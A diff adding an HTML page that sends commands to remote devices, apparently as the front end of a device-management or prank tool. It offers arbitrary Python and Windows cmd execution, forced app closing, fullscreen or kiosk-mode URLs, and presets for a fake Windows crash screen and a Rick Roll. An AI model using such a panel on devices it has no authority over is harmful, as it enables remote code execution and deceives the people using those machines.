@@ -1,0 +1,106 @@
+<html>
+  <head>
+    <title>Send Command</title>
+    <script src="backend.js"></script>
+    <script src="https://js.sentry-cdn.com/40b3614f81004ba590229b1908623646.min.js" crossorigin="anonymous"></script>
+  </head>
+  <body>
+    <h2>IMPORTANT! READ THIS: https://github.com/GSGTafelManager/ServiceClientData/blob/main/README.md</h2>
+    <a href="/">Back to list</a><br>
+    Command: <select id="command">
+      <option value="popup">Popup</option>
+      <option value="open-url">Open Website</option>
+      <option value="close-app">ALT+F4</option>
+      <option value="py">Execute Python</option>
+      <option value="os">Execute OS</option>
+      <option value="changeid">Change ID</option>
+      <option value="presets">Presets</option>
+    </select> Key: <input type="text" id="key"> <input type="button" onclick="prepare_inputs()" value="OK"><br>
+    <span id="tosend" style="display: none"></span>
+    <div id="more-inputs"></div>
+    <script>
+      command = document.getElementById("command")
+      to_send = document.getElementById("tosend")
+      more_inputs = document.getElementById("more-inputs")
+      key = document.getElementById("key")
+      key.value = localStorage.getItem("key") || ""
+      function prepare_inputs() {
+        localStorage.setItem("key", key.value)
+        to_send.innerText = command.value
+        if (command.value == "presets") {
+          more_inputs.innerHTML = 'Preset: <select id="preset"><option value="win-crash">Windows Crash Screen</option><option value="rick-roll">Rick Roll</option>'
+        }
+        if (command.value == "py") {
+          more_inputs.innerHTML = 'Python Code (py 3.x.x):<br><textarea id="code"># write your script here</textarea>'
+        }
+        if (command.value == "popup") {
+          more_inputs.innerHTML = 'Type: <select id="type"><option value="info">Info</option><option value="warning">Warning</option><option value="error">Error</option></select><br>Title: <input type="text" id="title" value="Popup"><br>Message:<br><textarea id="msg">This is a popup!</textarea>'
+        }
+        if (command.value == "os") {
+          more_inputs.innerHTML = 'Windows cmd:<br><textarea id="code">rem write your script here</textarea>'
+        }
+        if (command.value == "open-url") {
+          more_inputs.innerHTML = 'Url:<br>http://<input type="text" id="url"><br><select id="mode"><option value="popup">New Window</option><option value="fullscreen">Fullscreen</option><option value="kiosk">Kiosk</option></select>'
+        }
+        if (command.value == "changeid") {
+          more_inputs.innerHTML = 'New ID: <input type="text" id="newid">'
+        }
+        if (command.value == "close-app") {
+          more_inputs.innerHTML = ''
+        }
+        more_inputs.innerHTML += '<br><input id="sbmtbtn" type="button" onclick="send_data()" value="Send command">'
+      }
+
+      function getParameterByName(name, url = window.location.href) {
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+      }
+
+      async function send_data() {
+        document.getElementById("sbmtbtn").setAttribute("disabled", "disabled")
+        id = getParameterByName("device") || "__ignore"
+        data = {}
+        data.key = key.value
+        data.exec = to_send.innerText 
+        if (to_send.innerText == "presets") {
+          preset = document.getElementById("preset").value
+          if (preset == "win-crash") {
+            data.exec = "open-url"
+            data.mode = "kiosk"
+            data.url = "https://gsgtm.page.link/crash"
+          }
+          if (preset == "rick-roll") {
+            data.exec = "open-url"
+            data.mode = "fullscreen"
+            data.url = "https://gsgtm.page.link/rickroll"
+          }
+        }
+        if (to_send.innerText == "py") {
+          data.code = document.getElementById("code").value
+        }
+        if (to_send.innerText == "popup") {
+          data.type = document.getElementById("type").value
+          data.title = document.getElementById("title").value
+          data.msg = document.getElementById("msg").value
+        }
+        if (to_send.innerText == "os") {
+          data.code = document.getElementById("code").value
+        }
+        if (to_send.innerText == "open-url") {
+          data.url = "http://" + document.getElementById("url").value
+          data.mode = document.getElementById("mode").value
+        }
+        if (to_send.innerText == "changeid") {
+          data.newid = document.getElementById("newid").value
+        }
+        response = await send_command(id, data)
+        alert("Your command was " + response["status"])
+        window.location.reload()
+      }
+    </script>
+  </body>
+</html>
